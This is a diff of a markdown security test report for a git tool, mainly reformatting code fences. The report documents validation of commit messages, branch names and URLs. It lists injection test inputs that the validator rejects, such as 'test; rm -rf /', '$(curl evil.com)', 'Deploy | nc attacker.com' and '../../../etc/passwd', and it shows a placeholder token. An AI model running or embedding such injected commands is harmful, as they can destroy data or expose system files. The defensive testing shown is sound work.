@@ -72,7 +72,8 @@ Dangerous commit messages tested:
 "Merge $(whoami)@evil.com"
 "Deploy | nc attacker.com"
 "Release; cat /etc/passwd"
-```
+
+```text
 
 All dangerous messages are safely handled when passed as list arguments to subprocess.run().
 
@@ -82,12 +83,18 @@ Rejected patterns:
 
 ```bash
 "test; rm -rf /"           # Command terminator
+
 "test | cat /etc/passwd"   # Pipe operator
+
 "test && curl evil.com"    # Logical AND operator
+
 "test`whoami`"             # Command substitution
+
 "test$(whoami)"            # Command substitution
+
 "test\n; evil"             # Newline + command
-```
+
+```text
 
 Valid pattern enforced: `^[a-zA-Z0-9\-_/]+$`
 
@@ -97,9 +104,12 @@ Rejected URLs:
 
 ```bash
 "$(curl evil.com)"                              # Command substitution
+
 "`whoami`@github.com:user/repo.git"            # Command substitution
+
 "git@github.com:user/repo.git; rm -rf /"      # Command terminator
-```
+
+```text
 
 ### 3. Git Parsing Validation (5 tests - ✅ PASSED)
 
@@ -171,7 +181,8 @@ URLs with embedded credentials are detected and would be masked:
 ```bash
 Before: https://user:password@gitlab.com/group/project.git
 After:  https://***:***@gitlab.com/group/project.git
-```
+
+```text
 
 ### 5. Logging Privacy (9 tests - ✅ PASSED)
 
@@ -218,7 +229,8 @@ Dangerous error patterns that would be masked:
 
 ❌ SELECT * FROM credentials WHERE user_id = 1
 ✅ [credentials table access blocked]
-```
+
+```text
 
 ### 6. Data Retention & Git Operations (3 tests - ✅ PASSED)
 
@@ -356,23 +368,25 @@ All medium-risk scenarios (improper logging, credential caching) properly handle
 
 ### Valid Git Patterns
 
-```
+```text
 Branch: feature/user-auth
 SHA-1:  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
 SHA-256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
 URL:    https://github.com/owner/repo.git
 Token:  ghp_1234567890abcdef1234567890abcdef1234
-```
+
+```text
 
 ### Invalid Git Patterns
 
-```
+```text
 Branch:   ../../../etc/passwd
 SHA-1:    g_not_hex_characters_123456789abcdef
 URL:      $(curl evil.com)
 Token:    exposed_in_error_message
 Message:  "; rm -rf /"
-```
+
+```text
 
 ## Certification
 
